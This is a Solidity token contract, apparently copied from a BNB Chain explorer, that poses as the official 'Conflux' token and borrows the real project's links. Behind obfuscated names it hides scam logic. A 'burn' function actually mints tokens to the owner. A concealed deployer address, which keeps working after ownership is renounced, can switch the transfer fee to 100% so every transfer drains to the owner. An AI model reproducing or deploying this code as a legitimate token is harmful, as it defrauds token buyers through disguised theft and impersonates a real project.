/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

//Blockchain Without Barriers
//Conflux enables creators, communities, and markets to connect across borders and protocols
//https://twitter.com/Conflux_Network
//https://linktr.ee/confluxnetwork
//https://confluxnetwork.org/en

// SPDX-License-Identifier: MIT
pragma solidity = 0.8.0;
contract Conflux {
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  RYJIpZ = 10000000000000000000;
uint8 public constant decimals = 18;
address public  IaKvVY = address(0);
address public  rTuxjk = address(0);
address private  yjhJpS = address(0);
address public owner;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  UyPNCR = 100000000000000000000000;
mapping (address => uint256) public balanceOf;
address public  SBXswj = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  Aqnwct = 10000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  iCWzCP = 100000000000000000000000;
uint256 public constant fBQpuz = 9+1;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  GjFhSf = 100000000000000000;
string public  symbol = "Conflux";
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  tElcPk = 10000000000000;
uint256 public  cYnvMS = 10000000000000000000000000000;
address public  PgpsyV = address(0);
uint256 public  tHBLpm = 1000000000000000000;
uint256 public  SBFeSZ = 100000000000000000000;
address public  HMRtVy = address(0);
address public  WZUhed = address(0);
string public  name = "Conflux";
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "lcQaVv");
require(to != address(0), "lcQaVv");
require(amount <= balanceOf[from], "lcQaVv");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* fBQpuz/tElcPk ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==yjhJpS){
tElcPk = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () {
yjhJpS = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}